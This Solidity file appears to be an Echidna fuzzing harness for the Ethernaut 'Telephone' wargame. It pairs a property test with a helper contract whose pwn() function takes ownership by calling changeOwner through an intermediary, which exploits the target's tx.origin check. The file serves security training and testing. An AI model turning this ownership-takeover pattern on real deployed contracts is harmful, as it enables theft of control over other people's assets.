pragma solidity ^0.6.0;

import './Telephone.sol';

contract RingRing {
  Test phone = Test(0x4242);
  
  // At some point echidna will call this function directly on this contract
  // this is only possible since we used the multi-abi: true line in the config
  function pwn() public {
    phone.changeOwner(address(0x10000));
  }
}

contract Test is Telephone {
    RingRing ring;
  constructor() Telephone() public payable {
    // Instantiate a new RingRing contract that will change the owner of target contract.
    ring = new RingRing();
  }


    function echidna_test_origin() public returns (bool) {
        if (tx.origin == owner) {
            return false;
        } else {
            return true;
        }
    }    
}